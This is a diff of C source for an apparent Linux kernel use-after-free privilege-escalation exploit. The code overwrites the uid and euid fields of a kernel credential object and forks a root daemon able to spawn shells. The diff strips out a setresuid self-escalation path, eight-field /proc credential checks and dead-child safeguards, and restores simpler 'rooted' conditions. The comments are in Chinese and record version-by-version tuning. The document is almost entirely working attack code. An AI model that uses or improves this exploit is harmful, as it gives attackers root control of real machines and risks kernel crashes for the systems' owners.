@@ -1740,45 +1740,6 @@ static volatile int g_daemon_mode = 0;
  * second rootd would fight over the same socket path. */
 static int g_rootd_forked = 0;
 
-/* 2.0.39/2.0.41：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
- * （real/effective/saved/fs），无需对方配合即可验证任何字段对。
- * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
-static int read_pid_ids(int pid, unsigned uids[4], unsigned gids[4])
-{
-	char path[64], line[160];
-	FILE *file;
-	int have_u = 0, have_g = 0;
-	snprintf(path, sizeof(path), "/proc/%d/status", pid);
-	file = fopen(path, "r");
-	if (!file)
-		return -1;
-	while (fgets(line, sizeof(line), file)) {
-		if (!have_u && !strncmp(line, "Uid:", 4))
-			have_u = sscanf(line + 4, "%u %u %u %u",
-				&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
-		else if (!have_g && !strncmp(line, "Gid:", 4))
-			have_g = sscanf(line + 4, "%u %u %u %u",
-				&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
-	}
-	fclose(file);
-	return have_u && have_g ? 0 : -1;
-}
-
-/* 2.0.41（RC-7 修复）：rootd 必须在八字段全零的 cred 副本上出生——半清副本
- * 会被 prepare_creds() 永久固化进 rootd（39.log 中 socket 属主 2000 即 fsuid
- * 泄漏的实证）。procfs 读失败时 fail-open 放行，不让通道卡死。
- * 在 cred 子进程内调用（读自己的 /proc/self）。 */
-static int self_ids_all_zero(void)
-{
-	unsigned u[4], g[4];
-	if (read_pid_ids(getpid(), u, g) != 0)
-		return 1;
-	for (int i = 0; i < 4; i++)
-		if (u[i] || g[i])
-			return 0;
-	return 1;
-}
-
 static void cred_child(void)
 {
 	sigset_t block;
@@ -1809,11 +1770,6 @@ static void cred_child(void)
 		unsigned uid, euid, gid, egid;
 		unsigned char go;
 		char msg[96];
-		/* 2.0.43：降级授权。父进程在八字段中的滞留字段连续 6 个尝试无
-		 * 进展后决定带缺交接（2.0.42），通过管道发 0xBB 通知本进程——
-		 * 否则父进程降级、本进程的 self_ids_all_zero() 门禁仍严格，
-		 * rootd 永远不会被 fork（第 20 次实测：通道没有建立）。 */
-		int allow_degraded = 0;
 		/* Blocking read, as in the reference implementation: the child stays
 		 * asleep unless the parent actually talks to it, which keeps the page
 		 * reclaim race undisturbed. A read failure means the parent closed the
@@ -1859,30 +1815,6 @@ static void cred_child(void)
 			g_daemon_mode = 1;
 			continue;
 		}
-		if (go == 0xBB) {
-			/* 2.0.43：父进程的带缺交接授权。置位后按普通查询处理
-			 * （应答 + fork 判据放行），同一次迭代内完成。 */
-			allow_degraded = 1;
-			dprintf(STDOUT_FILENO,
-				"[child-cred] degraded handoff authorized by parent\n");
-			go = 1;
-		}
-		if (go == 0xCC) {
-			/* 2.0.45：内核许可的自助提权。写零已把 ruid/rgid 清零后，
-			 * 非特权 setresgid/setresuid 允许把其余身份字段设为当前
-			 * {r,e,s} 集合内的值——0 在集合内。commit_creds 走标准
-			 * 内核路径产生全新的全零 cred_jar 对象（suid/fsuid 天然
-			 * 归零），比瓦片拼凑的半清 cred 干净得多，且 rootd 的
-			 * fork 门禁与八字段自查天然通过。注意：此后 task 指向新
-			 * cred，旧对象（g_cred_kva）已被调换，父进程不得再对它
-			 * 开瓦片。 */
-			setresgid(0, 0, 0);
-			setresuid(0, 0, 0);
-			dprintf(STDOUT_FILENO,
-				"[child-cred] self-escalate via setresid: uid=%d euid=%d gid=%d egid=%d\n",
-				getuid(), geteuid(), getgid(), getegid());
-			go = 1;
-		}
 		uid = getuid();
 		euid = geteuid();
 		gid = getgid();
@@ -1905,8 +1837,7 @@ static void cred_child(void)
 		 * The forked rootd gets a *copy* of the cred from prepare_creds(), i.e.
 		 * a real cred_jar object, so it can fork shells and exit normally.
 		 */
-		if (uid == 0 && euid == 0 &&
-		    (self_ids_all_zero() || allow_degraded) && !g_rootd_forked) {
+		if (uid == 0 && euid == 0 && !g_rootd_forked) {
 			pid_t rd = fork();
 			if (rd == 0) {
 				setpgid(0, 0);
@@ -1934,6 +1865,30 @@ static void log_proc_uid(pid_t pid)
 			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
 	}
 	fclose(file);
+}
+
+/* 2.0.39：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
+ * （real/effective/saved/fs），无需 child 配合即可验证任何字段对。
+ * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
+static int read_child_ids(unsigned uids[4], unsigned gids[4])
+{
+	char path[64], line[160];
+	FILE *file;
+	int have_u = 0, have_g = 0;
+	snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
+	file = fopen(path, "r");
+	if (!file)
+		return -1;
+	while (fgets(line, sizeof(line), file)) {
+		if (!have_u && !strncmp(line, "Uid:", 4))
+			have_u = sscanf(line + 4, "%u %u %u %u",
+				&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
+		else if (!have_g && !strncmp(line, "Gid:", 4))
+			have_g = sscanf(line + 4, "%u %u %u %u",
+				&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
+	}
+	fclose(file);
+	return have_u && have_g ? 0 : -1;
 }
 
 static int ask_child(unsigned *uid, unsigned *euid, unsigned *gid, unsigned *egid)
@@ -2388,30 +2343,10 @@ int uaf_plant_main(int argc, char **argv)
 	const int cred_field_off[4] = { 4, 12, 20, 28 };
 	const char *cred_field_name[4] = { "uid/gid", "euid/egid", "suid/sgid", "fsuid/fsgid" };
 	int field_done[4] = { 0, 0, 0, 0 };
-	int half_cleared_streak = 0;
-	/* 2.0.44（RC-5b 修订）：child 是 g_cred_kva 指向 cred 页的唯一持有者，
-	 * 其消亡即对象引用归零、页被内核释放——此后对 g_cred_kva 开瓦片就是
-	 * 写 freed slab（堆破坏）。循环内每轮探活，真死立即停火。 */
-	int child_gone = 0;
-	/* 2.0.45：自助提权状态。瓦片只负责 cred+4（uid/gid）——历史数据里
-	 * 它从未粘滞（2~5 个周期必落）；euid/suid/fsuid 的"粘滞"是每次
-	 * boot 的确定性行为（44.log：euid 24 周期全命中页面却零落地），
-	 * 加周期无意义。ruid=0 后 child 经 setresuid(0,0,0) 内核许可路径
-	 * 自行归零其余字段。仅在自助路径失败时才回退到瓦片。 */
-	int self_escalated = 0;
 	for (int attempt = 1; attempt <= 24 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1, cgid = 1, cegid = 1;
 		unsigned uids[4], gids[4];
 		int have_ids;
-		if (kill(g_cred_child_pid, 0) != 0 && errno != EPERM) {
-			/* EPERM = 活着且已 root（2.0.37 起的判定）；其余 errno
-			 * （实际只会是 ESRCH）= 真死，停火。 */
-			child_gone = 1;
-			dprintf(STDOUT_FILENO,
-				"[cred] child %d is gone errno=%d; stop firing tiles\n",
-				g_cred_child_pid, errno);
-			break;
-		}
 		dprintf(STDOUT_FILENO, "[cred] clear attempt %d/24 cred=%#" PRIx64 "\n",
 			attempt, g_cred_kva);
 		if (!g_cred_kva) {
@@ -2419,7 +2354,7 @@ int uaf_plant_main(int argc, char **argv)
 			break;
 		}
 		/* /proc 全字段核对：已归零的字段对本轮跳过 */
-		have_ids = read_pid_ids(g_cred_child_pid, uids, gids) == 0;
+		have_ids = read_child_ids(uids, gids) == 0;
 		if (have_ids) {
 			field_done[0] |= uids[0] == 0 && gids[0] == 0;
 			field_done[1] |= uids[1] == 0 && gids[1] == 0;
@@ -2428,11 +2363,6 @@ int uaf_plant_main(int argc, char **argv)
 		}
 		int all_ok = 1;
 		for (int k = 0; k < 4; k++) {
-			/* 2.0.45：只有 uid/gid 需要瓦片；其余字段由 child 的
-			 * setresuid 自助提权解决。0xCC 之后 cred 对象被调换，
-			 * 任何情况下都不再对其他字段开瓦片。 */
-			if (k > 0)
-				continue;
 			if (field_done[k]) {
 				dprintf(STDOUT_FILENO, "[cred] %s already zero, skip\n",
 					cred_field_name[k]);
@@ -2451,39 +2381,15 @@ int uaf_plant_main(int argc, char **argv)
 			dprintf(STDOUT_FILENO, "[cred] field clear incomplete, retry\n");
 			continue;
 		}
-		/* 2.0.41（RC-7）：终局门禁从四值收紧为八字段全零——半清副本会被
-		 * prepare_creds() 固化进 rootd。/proc 读不到时 fail-open 回退旧
-		 * 四值门禁，不新增丢弃胜利的路径。 */
-		int all8 = !have_ids;
-		for (int i = 0; have_ids && i < 4; i++)
-			if (uids[i] || gids[i])
-				all8 = 0;
+		if (have_ids && uids[0] == 0 && uids[1] == 0) {
+			/* getuid/geteuid 全零 = 终局条件达成 */
+			rooted = 1;
+			continue;
+		}
 		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
 		if (ask_child(&uid, &euid, &cgid, &cegid) == 0) {
-			if (uid == 0 && euid == 0 && cgid == 0 && cegid == 0) {
+			if (uid == 0 && euid == 0) {
 				rooted = 1;
-				continue;
-			}
-			/* 2.0.45：uid/gid 已清而 euid 未落 → 停止瓦片，委托 child
-			 * 走 setresuid 自助提权（ruid=0 后 euid=0 在非特权允许
-			 * 集合内）。这是主路径，不是降级——瓦片对粘滞字段无效。 */
-			if (uid == 0 && cgid == 0 && !self_escalated) {
-				unsigned char esc = 0xCC;
-				struct timespec wait = { .tv_sec = 0, .tv_nsec = 500000000L };
-				dprintf(STDOUT_FILENO,
-					"[cred] uid/gid clear - delegating remaining ids to setresid self-escalation\n");
-				if (write(g_wake[1], &esc, 1) == 1)
-					nanosleep(&wait, NULL);
-				self_escalated = 1;
-				continue;
-			}
-			if (self_escalated && euid != 0) {
-				/* 理论上不可达：ruid=0 时 setresuid(0,0,0) 必成功。
-				 * 注意绝不能回退瓦片——0xCC 里 setresgid 的成功已触发
-				 * commit_creds，cred 对象被调换，旧 g_cred_kva 悬空，
-				 * 再开瓦片就是写 freed slab。安全选项只剩重试/重启。 */
-				dprintf(STDOUT_FILENO,
-					"[cred] self-escalation did not take effect (unexpected); no tiles after swap\n");
 				continue;
 			}
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
@@ -2492,26 +2398,6 @@ int uaf_plant_main(int argc, char **argv)
 		}
 	}
 	if (!rooted) {
-		/* 2.0.44（RC-5b 修订）：两种终局都没有需要驻留守护的状态——
-		 * 无 cred 时不持页；child 消亡时持页者已不存在。均干净退场，
-		 * 与 rc=5（leak_task 失败，L2332）区分开；只有「child 活着且
-		 * 已捕获 cred」的情形保留持页驻留（杀 child 会内核恐慌）。 */
-		int dead_child = child_gone ||
-			(kill(g_cred_child_pid, 0) != 0 && errno == ESRCH);
-		if (!g_cred_kva || dead_child) {
-			dprintf(STDOUT_FILENO,
-				"[uaf] inject failed: %s; exiting cleanly (rc=%d)\n",
-				dead_child ? "cred child is gone"
-					   : "no cred object was ever leaked",
-				dead_child ? 7 : 6);
-			log_sync();
-			close(g_wake[1]);
-			close(g_report[0]);
-			close_stream();
-			free_aio_hold();
-			log_sync();
-			return dead_child ? 7 : 6;
-		}
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
 		for (;;)
 			pause();
